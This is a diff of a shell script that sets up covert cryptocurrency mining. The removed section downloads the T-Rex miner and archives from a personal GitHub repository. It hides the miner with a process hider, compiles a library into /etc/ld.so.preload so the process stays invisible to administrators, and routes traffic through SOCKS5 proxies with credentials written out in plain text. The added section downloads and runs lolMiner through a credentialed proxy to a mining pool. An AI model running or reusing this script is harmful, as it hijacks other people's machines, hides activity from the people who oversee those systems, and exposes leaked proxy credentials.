@@ -1,52 +1,5 @@
-#!/bin/sh
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-npm i -g node-process-hider
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo ""
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo ""
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://github.com/trexminer/T-Rex/releases/download/0.24.6/t-rex-0.24.6-linux.tar.gz
-tar -xvzf t-rex-0.24.6-linux.tar.gz
-chmod +x t-rex
-ph add t-rex
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./t-rex -a ethash -o stratum+ssl://eth-us-west.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w DENT --proxy Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786
+sudo apt-get update -y
+sudo apt install screen -y
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+tar -xf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29 && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.GPU --proxy socks5 Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786 --ethstratum ETHPROXY
